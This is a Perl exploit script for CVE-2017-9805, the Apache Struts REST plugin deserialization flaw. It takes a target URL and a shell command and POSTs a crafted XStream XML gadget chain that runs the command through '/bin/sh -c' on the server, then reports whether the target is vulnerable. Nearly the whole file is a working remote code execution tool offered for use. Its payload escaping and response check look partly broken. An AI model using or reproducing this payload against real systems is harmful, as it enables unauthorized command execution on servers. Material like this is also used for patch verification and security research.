#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use Getopt::Long;

=pod

=head1 CVE-2017-9805

=head2 Date
06

=head2 Reporter(s)
Warflop

=head2 Description 

The REST Plugin in Apache Struts 2.1.2 through 2.3.x before 2.3.34 and
2.5.x before 2.5.13 uses an XStreamHandler with an instance of XStream
for deserialization without any type filtering, which can lead to
Remote Code Execution when deserializing XML payloads.


=cut

# Global Variables
my $DEBUG = 0;
my $VERBOSE = 0;

# Display The Header
header();

# Run The PoC
exploit();


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-9805 ]=================================";
    
    print qq{
$title
            
   Reporter : Warflop
       Date : 06
        CVE : CVE-2017-9805
            
Description :


The REST Plugin in Apache Struts 2.1.2 through 2.3.x before 2.3.34 and
2.5.x before 2.5.13 uses an XStreamHandler with an instance of XStream
for deserialization without any type filtering, which can lead to
Remote Code Execution when deserializing XML payloads.


};
    print "="x(length($title)) . "\n\n";
}

sub exploit_header {
    system("clear");
    print color("red");
    print " ____     __  __  ____                 ___       __      _     ________          __      __       __   ______    \n";
    print "/\\  _`\\  /\\ \\/\\ \\/\\  _`\\             /'___`\\   /'__`\\  /' \\   /\\_____  \\       /'_ `\\  /'_ `\\   /'__`\\/\\  ___\\   \n";
    print "\\ \\ \\/\\_\\\\ \\ \\ \\ \\ \\ \\L\\_\\          /\\_\\ /\\ \\ /\\ \\/\\ \\/\\_, \\  \\/___//'/'      /\\ \\L\\ \\/\\ \\L\\ \\ /\\ \\/\\ \\ \\ \\__/   \n";
    print " \\ \\ \\/_/_\\ \\ \\ \\ \\ \\  _\\L   _______\\/_/// /__\\ \\ \\ \\ \\/_/\\ \\     /' /'_______\\ \\___, \\/_> _ <_\\ \\ \\ \\ \\ \\___``\\ \n";
    print "  \\ \\ \\L\\ \\\\ \\ \\_/ \\ \\ \\L\\ \\/\\______\\  // /_\\ \\\\ \\ \\_\\ \\ \\ \\ \\  /' /' /\\______\\\\/__,/\\ \\/\\ \\L\\ \\\\ \\ \\_\\ \\/\\ \\L\\ \\\n";
    print "   \\ \\____/ \\ `\\___/\\ \\____/\\/______/ /\\______/ \\ \\____/  \\ \\_\\/\\_/   \\/______/     \\ \\_\\ \\____/ \\ \\____/\\ \\____/\n";
    print "    \\/___/   `\\/__/  \\/___/           \\/_____/   \\/___/    \\/_/\\//                   \\/_/\\/___/   \\/___/  \\/___/ \n";
    print "                                                                                                                 \n";
    print "                                                                                                                 \n";

    
    print color("green");
    print "\nGithub : https://github.com/gottburgm/\n";
    print "\n\n";
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0  --url URL --cmd CMD [OPTIONS]
        
        # Arguments


            --url [VALUE]		: The Target URL [Format: scheme://host]
            --user-agent [VALUE]		: User-Agent To Send To Server
            --cookie [VALUE]		: Cookie String To Use
            --proxy [VALUE]		: Proxy Server To Use [Format: scheme://host:port]
            --timeout [VALUE]		: Max Timeout For The HTTP Requests
            --auth [VALUE]		: Credentials To Use For HTTP Login [Format: username:password]
            --help        		: Display The Help Menu
            --verbose        		: Be More Verbose
            --debug        		: Debug Mode
            --cmd [VALUE]		: The Command To Execute On Remote Server
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'PUT', 'DELETE', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $payload = '?' . $payload if($payload);
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload) if($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my $browser = 0;
    my $request = 0;
    my $response = 0;
    my $method = 0;
    my $content_type = 0;
    my $base_url = 0;
    my $base_path = 0;
    my $path = 0;
    my $payload = 0;
    my $vulnerable = 1;


    my $url = 0;		# Command Argument : url
    my $useragent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0";		# Command Argument : user-agent
    my $cookie_string = 0;		# Command Argument : cookie
    my $auth = 0;		# Command Argument : auth
    my $cmd = "id";		# Command Argument : cmd
    my $proxy = 0;		# Command Argument : proxy
    my $timeout = 0;		# Command Argument : timeout
    GetOptions(
    	"debug!"		=> \$DEBUG,
    	"url=s"		=> \$url,
    	"help"		=> \&Help,
    	"user-agent=s"		=> \$useragent,
    	"cookie=s"		=> \$cookie_string,
    	"auth=s"		=> \$auth,
    	"cmd=s"		=> \$cmd,
    	"proxy=s"		=> \$proxy,
    	"timeout=i"		=> \$timeout,
    	"verbose!"		=> \$VERBOSE,
    ) or error("Bad Value(s) Provided In Command Line Arguments");

### Required Arguments

    die error("Required Argument(s) Missing .") if(!$url || !$cmd);    
    
    exploit_header();
    
    if($url =~ /https?:\/\/[^\/]*\/[a-zA-Z0-9\-\.\_\/\\]+/i) {
        ($base_url, $base_path) = $url =~ /(https?:\/\/[^\/]*)(\/[^\?]*)/i;
    }
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    $browser->default_header('Cookie' => $cookie_string) if($cookie_string);
    
    if($proxy) {
        if($proxy =~ /([a-z])+:\/\/.*:([0-9])+/i) {
            $browser->proxy( [qw( http https ftp ftps )] => $proxy);
        } else {
            error("Wrong Proxy String Given, Use Format : scheme://host:port");
        }
    }
    
    
    ### Build/send the requests

  $cmd = "echo h3llisc0ming;$cmd";

  $method = "POST";
  $path = "/struts2-rest-showcase/orders/";
  $payload = "<map>\n<entry>\n<jdk.nashorn.internal.objects.NativeString>\n<flags>0</flags>\n<value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n<dataHandler>\n<dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage\$XmlDataSource\">\n<is class=\"javax.crypto.CipherInputStream\">\n<cipher class=\"javax.crypto.NullCipher\">\n<initialized>false</initialized>\n<opmode>0</opmode>\n<serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n<iter class=\"javax.imageio.spi.FilterIterator\">\n<iter class=\"java.util.Collections\$EmptyIterator\"/>\n<next class=\"java.lang.ProcessBuilder\">\n<command>\n<string>/bin/sh</string><string>-c</string><string>\$cmd</string>\n</command>\n<redirectErrorStream>false</redirectErrorStream>\n</next>\n</iter>\n<filter class=\"javax.imageio.ImageIO\$ContainsFilter\">\n<method>\n<class>java.lang.ProcessBuilder</class>\n<name>start</name>\n<parameter-types/>\n</method>\n<name>foo</name>\n</filter>\n<next class=\"string\">foo</next>\n</serviceIterator>\n<lock/>\n</cipher>\n<input class=\"java.lang.ProcessBuilder\$NullInputStream\"/>\n<ibuffer/>\n<done>false</done>\n<ostart>0</ostart>\n<ofinish>0</ofinish>\n<closed>false</closed>\n</is>\n<consumed>false</consumed>\n</dataSource>\n<transferFlavors/>\n</dataHandler>\n<dataLen>0</dataLen>\n</value>\n</jdk.nashorn.internal.objects.NativeString>\n<jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n</entry>\n<entry>\n<jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n<jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n</entry>\n</map>";
  $content_type = "application/xml";

  info("Sending Command Execution Payload [Command: \$cmd]");
  info("Sending : ($method) $url$path");

  $request = buildRequest($url . $path, $method, $payload, $content_type);
  $response = $browser->request($request);
  displayResponse($response);

  $vulnerable = 0 if(!validate("TSTRING", "h3llisc0ming", $response));
    
    

    ### Validate or not the test
    if($vulnerable) {
        print "\n\n" . color("white") . "[" . color("red") . "VULNERABLE" . color("white") . "] " . color("green") . $base_url . color("white") . " is affected or any kind of validation was provided.\n";
    } else {
        print "\n\n" . color("white") . "[" . color("yellow") . "NOT VULNERABLE" . color("white") . "] " . color("green") . $base_url . color("white") . " is not affected.\n";
    }
    
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $status = "FAILED";
    my $status_color = "red";
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    warn("Expected : " . $header_parts[0] . " Not Found In Response Headers");
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        if($VERBOSE || $DEBUG) {
            if($positive) {
                $status = "SUCESS";
                $status_color = "green";
         
                print color("white") . "   [" . color("magenta") . "V" . color("white") . "]" . color("blue") . "( " . color("$status_color") . $status . color("blue") . " ) [Validation] Expected : " . color("cyan") . "$validation_value" . color("blue") . ", Got : " . color("cyan") . "$value\n";
            }
        }
        
        return $positive;
    }
    
    return 0;
}

sub displayResponse {
    my ( $response ) = @_;
    
    print color("white") . "   [" . color("magenta") . "R" . color("white") . "]" . color("blue") . "( URL ) " . color("green") . $response->request->uri . "\n";
    print "\t" . color("blue") . "---[ HTTP Code :" . color("green") . $response->code . "\n";
    
    if($VERBOSE) {
        print "\t" . color("blue") . "---[ HTTP Status :" . color("green") . $response->message . "\n";
        print "\t" . color("blue") . "---[ Content Size :" . color("green") . length($response->content) . "\n";
    }
    
    if($DEBUG) {
        
    }
}

sub info {
    my ( $text ) = @_;
    print color("white") . "[" . color("blue") . "*" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("blue") . " $text\n";
}

sub warning {
    my ( $text ) = @_;
    print color("white") . "[" . color("yellow") . "!" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("blue") . "$text\n";
}

sub error {
    my ( $text ) = @_;
    print color("white") . "[" . color("red") . "-" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("blue") . "$text\n";
    exit;
}
